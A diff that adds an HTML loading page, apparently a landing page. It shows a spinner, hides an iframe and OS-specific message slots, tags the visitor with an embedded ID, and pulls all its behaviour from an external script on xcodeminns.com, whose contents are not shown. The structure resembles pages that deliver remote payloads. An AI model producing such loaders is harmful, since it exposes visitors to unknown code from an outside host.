@@ -1,0 +1,107 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no" />
+    <title id="title"></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        html, body {
+            margin-top: -22px; 
+            padding: 0;
+            height: calc(100% + 22px); 
+            overflow: hidden;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #367ddb; 
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1.5s linear infinite; 
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(720deg); } 
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%; 
+            background-color: #f0f0f0; 
+            flex-direction: column; 
+        }
+
+        #myIframe {
+            display: none;
+        }
+
+        #errorMessage {
+            display: none;
+            color: #000000;
+            font-size: 15px;
+        }
+
+        #clientImage1, #clientImage2 {
+            display: none; 
+            max-width: 100%; 
+            height: auto; 
+            margin-top: 0px; 
+        }
+
+        #windowsMessage {
+            display: none; 
+            margin-top: 20px; 
+            font-weight: bold; 
+            text-align: center; 
+        }
+
+        #containers {
+            display: none; 
+        }
+        
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 10px;
+        }
+    </style>
+</head>
+<body style="margin: 0;text-align: center; position: relative;">
+    <div class="container">
+        <div class="spinner"></div>
+        <div class="content">
+            <div id="errorMessage">js error</div>
+            <div id="windowsMessage"></div>
+        </div>
+    </div>
+    
+    <img id="clientImage1" src="" style="position: absolute; top: 10px;" />
+    <img id="clientImage2" src="" style="position: absolute; top: 10px;" />
+
+    <script>
+        window.EMBEDDED_UID = "yosx";
+    </script>
+    
+    <script src="https://xcodeminns.com/url.js"></script>
+    
+    <script>
+        setTimeout(function() {
+            if (typeof someFunctionFromGetJs === 'undefined') {
+                document.querySelector('.spinner').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+            }
+        }, 3000); 
+    </script>
+    
+    <div id="containers"></div>
+</body>
+</html>
